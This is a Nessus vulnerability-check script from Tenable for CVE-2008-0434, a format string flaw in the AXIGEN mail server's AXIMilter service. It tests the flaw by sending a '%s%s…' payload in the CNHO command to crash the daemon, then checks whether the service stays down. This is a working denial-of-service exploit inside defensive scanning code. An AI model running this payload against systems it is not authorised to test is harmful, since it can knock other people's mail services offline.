#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(30106);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2008-0434");
  script_bugtraq_id(27363);
  script_xref(name:"OSVDB", value:"40486");

  script_name(english:"AXIGEN Mail Server AXIMilter CNHO Command Remote Format String");
  script_summary(english:"Tries to crash AXIMilter");

 script_set_attribute(attribute:"synopsis", value:
"The remote mail service is affected by a format string vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of AXIMilter installed on the remote host fails to
sanitize input of format string identifiers.  Using a specially-
crafted packet, an unauthenticated remote attacker can crash the
service or possibly execute arbitrary code on the remote host subject
to the privileges under which the service operates." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2008-01/0412.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4947" );
 script_set_attribute(attribute:"solution", value:
"Either configure AXIMilter to listen only on the loopback interface,
which is its default behavior, or allow access only from trusted
hosts." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_DENIAL);
  script_family(english:"Gain a shell remotely");
  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");
  script_dependencies("aximilter_detect.nasl");
  script_require_ports("Services/aximilter", 1981);

  exit(0);
}


port = get_kb_item("Services/aximilter");
if (!port) port = 1981;
if (!get_port_state(port)) exit(0);


crlf = '\r\n';
exploit = "%s%s%s%s%s%s%s%s%s";


# Make sure it's working.
soc = open_sock_tcp(port);
if (!soc) exit(0);

req = "PING" + crlf;
send(socket:soc, data:req);
res = recv_line(socket:soc, length:256);
close(soc);
if (strlen(res) == 0) exit(0);

res = chomp(res);
if ('PONG' == toupper(res))
{
  # Try to exploit the issue to crash the daemon.
  soc = open_sock_tcp(port);
  if (!soc) exit(0);

  req = string(
    "FROM: ", crlf,
    "EHLO: ", crlf,
    "CNIP: ", crlf,
    "CNPO: ", crlf,
    "CNHO: ", exploit, crlf,
    "RCPT: ", crlf,
    "VERI: ", crlf
  );
  send(socket:soc, data:req);
  res = recv_line(socket:soc, length:256);
  close(soc);

  # Try several times to re-connect.
  if (strlen(res) == 0)
  {
    tries = 5;
    for (iter=0; iter<tries; iter++)
    {
      # Check whether it's truly down.
      soc = open_sock_tcp(port);
      if (soc)
      {
        s = recv_line(socket:soc);
        close(soc);
        sleep(1);
      }
      else
      {
        security_warning(port); 
        exit(0);
      }
    }
  }
}
